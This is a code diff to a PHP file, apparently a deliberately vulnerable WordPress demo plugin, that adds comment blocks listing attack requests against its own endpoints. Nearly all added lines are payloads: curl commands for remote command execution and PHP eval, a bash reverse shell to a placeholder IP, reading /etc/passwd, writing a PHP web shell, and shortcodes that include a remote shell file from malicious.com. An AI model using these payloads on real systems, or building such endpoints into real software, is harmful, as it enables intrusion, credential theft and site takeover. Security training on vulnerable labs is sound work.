@@ -345,3 +345,32 @@ function display_security_logs() {
     </div>
     <?php
 }
+
+/**  
+ * # Basic command execution
+* curl "http://yoursite.test/wp-admin/admin-ajax.php?action=process_data&command=id"
+* curl "http://yoursite.test/wp-admin/admin-ajax.php?action=process_data&command=ls+-la+/etc"
+
+* # PHP code execution
+* curl "http://yoursite.test/wp-admin/admin-ajax.php?action=process_data&eval_code=echo+shell_exec('whoami');"
+
+* # Reverse shell (be careful!)
+* curl "http://yoursite.test/wp-admin/admin-ajax.php?action=process_data&command=bash+-c+'bash+-i+>%26+/dev/tcp/YOUR_IP/PORT+0>%261'"
+ *  
+*/
+
+/**
+ * # Read arbitrary files
+* curl "http://yoursite.test/wp-admin/admin-ajax.php?action=file_operations&read_file=/etc/passwd"
+* # Write files
+* curl "http://yoursite.test/wp-admin/admin-ajax.php?action=file_operations&write_file=shell.php&content=<?php+system(\$_GET['cmd']);?>"
+ */
+
+/**
+ * ShortCodes
+ * [execute cmd="cat /etc/passwd"]
+* [include_file file="/etc/passwd"]
+* [include_file url="http://malicious.com/shell.txt"] 
+ */
+
+# Admin Panel Exploitation - /wp-admin/admin.php?page=security-demo
